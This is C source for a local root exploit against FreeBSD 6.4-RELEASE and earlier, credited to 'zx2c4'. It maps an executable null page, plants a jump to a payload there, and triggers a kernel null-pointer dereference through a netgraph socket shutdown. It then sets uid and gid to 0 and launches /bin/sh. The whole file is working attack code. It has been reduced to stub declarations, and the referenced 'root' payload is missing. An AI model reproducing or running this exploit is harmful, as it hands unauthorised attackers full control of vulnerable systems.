
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int MAP_ANON ;
 int MAP_FIXED ;
 int NG_DATA ;
 int PAGES ;
 int PAGE_SIZE ;
 int PF_NETGRAPH ;
 int PROT_EXEC ;
 int PROT_READ ;
 int PROT_WRITE ;
 int SHUT_RDWR ;
 int SOCK_DGRAM ;
 int execl (char*,char*,int *) ;
 scalar_t__ getuid () ;
 int got_root ;
 scalar_t__ mmap (int *,int,int,int,int,int ) ;
 int perror (char*) ;
 int printf (char*) ;
 int root ;
 int setgid (int ) ;
 int setuid (int ) ;
 int shutdown (int,int ) ;
 int socket (int ,int ,int ) ;

int main(int argc, char *argv[])
{
 printf("~ FreeBSD <= 6.4-RELEASE Netgraph Exploit ~\n");
 printf("~~~~~~~~~~~~~~~~~ by zx2c4 ~~~~~~~~~~~~~~~~\n");
 printf("~~~~~ greetz to don bailey, edemveiss ~~~~~\n\n");

 printf("[+] mmapping null page\n");
 if (mmap(((void*)0), PAGES * PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_FIXED, -1, 0) < 0) {
  perror("[-] mmap failed");
  return -1;
 }

 printf("[+] adding jmp to pwnage in null page\n");
 *(char*)0x0 = 0x90;
 *(char*)0x1 = 0xe9;
 *(unsigned long*)0x2 = (unsigned long)&root;

 printf("[+] opening netgraph socket\n");
 int s = socket(PF_NETGRAPH, SOCK_DGRAM, NG_DATA);
 if (s < 0) {
  perror("[-] failed to open netgraph socket");
  return -1;
 }

 printf("[+] triggering null dereference\n");
 shutdown(s, SHUT_RDWR);

 if (!got_root) {
  printf("[-] failed to trigger pwnage\n");
  return -1;
 }

 printf("[+] elevating permissions\n");
 setuid(0);
 setgid(0);
 if (getuid() != 0) {
  printf("[-] failed to get root\n");
  return -1;
 }

 printf("[+] got root!\n");
 execl("/bin/sh", "sh", ((void*)0));

 return 0;
}
